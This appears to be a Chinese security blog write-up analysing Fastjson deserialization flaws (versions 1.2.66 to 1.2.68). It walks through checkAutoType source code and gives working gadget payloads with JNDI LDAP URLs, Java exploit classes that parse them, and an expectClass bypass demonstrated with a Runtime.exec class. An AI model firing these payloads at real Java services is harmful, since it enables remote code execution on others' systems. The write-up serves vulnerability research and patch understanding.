<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 限制了JSON中@type指定的类名长度</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 单独对expectClass参数进行判断，设置expectClassFlag的值</span></span><br><span class="line"><span class="comment">// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                  || expectClass == Serializable.class</span><br><span class="line">                  || expectClass == Cloneable.class</span><br><span class="line">                  || expectClass == Closeable.class</span><br><span class="line">                  || expectClass == EventListener.class</span><br><span class="line">                  || expectClass == Iterable.class</span><br><span class="line">                  || expectClass == Collection.class</span><br><span class="line">                  ) &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.43检测，&quot;[&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.41检测，&quot;Lxx;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.42检测，&quot;LL&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,</span><br><span class="line">              TypeUtils.fnv1a_64(className)</span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>继续向下，internalWhite为false , 当我们开启autoTypeSupport时，就会走入下面的逻辑</p>
<p>首先通过hash进行白名单匹配，后续进行黑名单过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                    hash ^= (<span class="type">long</span>)className.charAt(mask);</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>因为并没有被黑名单过滤，所以我们走到了这里</p>
<p><code>autoTypeSupport</code>为true，因此我们不会走到if代码中并抛出异常，而是会走出if判断</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(mask);</span><br><span class="line">                    hash ^= (<span class="type">long</span>)c;</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>我们在后面的代码中就会执行<code>loadClass</code>方法，最后遍历调用setter与getter方法，最终执行恶意代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, cacheClass);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="vwjWL">补丁</h3>
黑名单绕过的补丁都是在新版本中向hash黑名单中添加相应的hash

<p>新版本运行后会抛出以下异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png"></p>
<h2 id="iFdOH">1.2.66 反序列化漏洞</h2>
1.2.66 反序列化，有着三条Gadget，其原理都为JNDI注入，也需要服务端存在其他依赖

<h3 id="Z4itN">1.2.66反序列化前提条件</h3>

<ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.66；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li>
<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
</ul>
<h3 id="edTnh">Gadget's POC</h3>
<h4 id="LH9SG">org.apache.shiro.realm.jndi.JndiRealmFactory</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png"></p>
<h4 id="x7M85">br.com.anteros.dbcp.AnterosDBCPConfig</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">或</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SRgjI">com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="KVFVy">EXP</h3>
EXP如下，记得开启AutoTypeSupport

<p>这几个Gadget都十分简单，不在过多分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP_1266</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="yVPEG">1.2.67反序列化漏洞</h2>
<h3 id="lOtJF">1.2.67反序列化前提条件</h3>

<ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.67；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
</ul>
<h3 id="gTkXQ">Fastjson循环引用</h3>
Fastjson支持循环引用，且默认开启

<p>参考如下</p>
<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p>
<p>在Fastjson中，向JsonArray类型的对象里面add数据时，如果数据相同，那么就会被替换成$ref，相当于定义了一下以便简化，因为数据也是一样的</p>
<p>$ref即循环引用：当一个对象包含另一个对象时，Fastjson会将$ref解析成引用</p>
<table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”$”}</font></td>
<td align="center">引用根对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”@”}</font></td>
<td align="center">引用自己</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”..”}</font></td>
<td align="center">引用父对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”..&#x2F;..”}</font></td>
<td align="center">引用父对象的父对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”$.members[0].reportTo”}</font></td>
<td align="center"><font style="color:rgb(51, 51, 51);">基于路径的引用</font></td>
</tr>
</tbody></table>
<p>那这样就清楚了，org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC中后面那段的{“$ref”:”$.tm”}，实际上就是基于路径的引用，相当于是调用root.getTm()函数，进而直接调用了tm字段的getter方法了</p>
<h3 id="xOPlY">Gadget's POC</h3>
<h4 id="AzrMp">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="QCent">org.apache.shiro.jndi.JndiObjectFactory</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sxkNl">EXP</h3>
EXP如下，其实并没有什么差别，还是那句话，记得开启AutoTypeSupport

<p>这几个Gadget也都十分简单，不在过多分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP_1267</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pJcT1">1.2.68反序列化漏洞（expectClass绕过AutoType）</h2>
<h3 id="adqSF">1.2.68反序列化前提条件</h3>

<ul>
<li>Fastjson &lt;&#x3D; 1.2.68</li>
<li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中</li>
</ul>
<h3 id="JLOJQ">绕过</h3>
<h4 id="b7fNW">绕过原理</h4>

<p>本次绕过的关键处在于<code>checkAutoType()</code>的第二个参数expectClass，我们可以通过构造恶意JSON数据、传入某个类作为exceptClass参数在传入另一个exceptClass的子类或者实现类来实现绕过<code>checkAutoType()</code>函数执行恶意操作</p>
<p><strong>步骤如下:</strong></p>
<ul>
<li>先传入某个类，其加载成功后作为exceptClass参数传入<code>checkAutoType</code>函数</li>
<li>查找exceptClass类的实现类或者子类，如果在子类或者实现类中其构造方法或者setter方法中存在危险操作即可利用</li>
</ul>
<h4 id="sFO75">可行性测试</h4>
简单测试一下该绕过方法的可行性

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExcept</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FastjsonExcept</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        rt.exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.FastjsonExcept&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在无需AutoType的情况下，即可执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png"></p>
<h4 id="bmimq">断点调试</h4>

<p>我们直接在<code>checkAutoType</code>下断点调试</p>
<p>第一次转入的类是<code>AutoCloseable</code>进行校验，这里我们可以看到expectClass为null</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png"></p>
<p>然后从缓存Mapping中直接获取到<code>AutoCloseable</code>，然后对获取的clazz进行了一系列的判断，判断clazz是不是null，以及internalWhite的判断，internalWhite里面的白名单一定是很安全的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png"></p>
<p>后续会出现对expectClass的判断，判断expectClass是否为空，且判断它是否继承HashMap类，若满足情况，则抛出异常，反之则会返回类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>回到<code>DefaultJSONParser</code>后，获取到clazz后再继续执行，根据<code>AutoCloseable</code>类获取到反序列化器为<code>JavaBeanDeserializer</code>使用该反序列化器进行反序列化操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png"></p>
<p>继续往里面走，调用<code>JavaBeanDeserializer</code>的<code>deserialze</code>方法，传入的第二个参数type即为<code>AutoCloseable</code>类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png"></p>
<p>往下面的逻辑，就是解析后面类的过程。这里看到获取不到对象反序列化器后，就会进入到if的判断中，设置 type 参数即 <code>java.lang.AutoCloseable</code> 类为 <code>checkAutoType()</code> 方法的 expectClass 参数来调用 <code>checkAutoType()</code> 函数来获取指定类型，然后在获取指定的反序列化器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png"></p>
<p>这次我们第二次进入<code>checkAutoType</code>方法，typeName是我们POC中的第二个类，exceptClass参数是POC中指定的第一个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png"></p>
<p>因为<code>AutoCloseable</code>并不是黑名单中的类，所以expectClassFlag被设置为true</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png"></p>
<p>最后走到我们刚刚说的地方，当这个类不在白名单，且autoType开启或者expectClassFlag为true时，即可进入Auto开启时的检测逻辑</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png"></p>
<p>往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png"></p>
<p>跟进该函数中，这里使用<code>AppClassLoader</code>加载 <code>VulAutoCloseable</code> 类并直接返回</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png"></p>
